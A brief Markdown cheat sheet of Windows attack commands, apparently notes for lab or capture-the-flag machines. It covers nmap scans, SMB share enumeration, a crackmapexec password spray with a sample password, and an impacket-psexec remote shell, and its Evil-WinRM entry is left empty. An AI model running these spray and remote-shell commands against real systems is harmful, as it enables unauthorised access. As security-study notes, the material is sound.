# Windows Recon & Attack
## Enumeration
### Scans
```bash
sudo nmap -p- -sC -sV $IP --open -oA scans/nmap_Initial
```

### SMB - Uncredentialed
List Shares
```bash
smbclient -L \\\\<IP or hostname> 
```
smbmap
```bash
smbmap -H <IP or hostname> -u null # Test for null access
```
### SMB - Credentialed
CME
```bash
crackmapexec smb 10.10.10.178 -u TempUser -p welcome2019 --shares
```
smbmap
```bash
smbmap -H <IP or Hostname> -u <user> -p <password>
```
smbclient
```bash
smbclient -U <user> //<host or ip>/<share> <password>
```
### Password Spray
CME
```bash
crackmapexec smb 10.10.10.178 -u Usernames.txt -p 'welcome2019' --local-auth --continue-on-success
```
## Remote Shell
### Impacket
Impacket-psexec
```bash
impacket-psexec <user>:<password>@<IP>
```
### Evil-WinRM
```bash
```
